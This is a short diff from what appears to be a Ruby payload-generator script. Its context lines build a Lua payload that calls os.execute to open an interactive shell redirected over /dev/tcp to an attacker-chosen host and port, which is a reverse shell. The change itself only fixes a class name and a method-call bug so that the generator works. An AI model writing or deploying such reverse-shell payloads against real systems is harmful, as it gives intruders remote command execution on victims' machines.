@@ -49,5 +49,5 @@ payload = ""
 payload += "require(\"os\");\n"
 payload += "os.execute(\"#{shell} -i &> /dev/tcp/#{host}/#{port} 0>&1\");\n"
 
-payload_handler = payloads.new
-payloads.generate_payload(file, payload)
+payload_handler = Payloads.new
+payload_handler.generate_payload(file, payload)
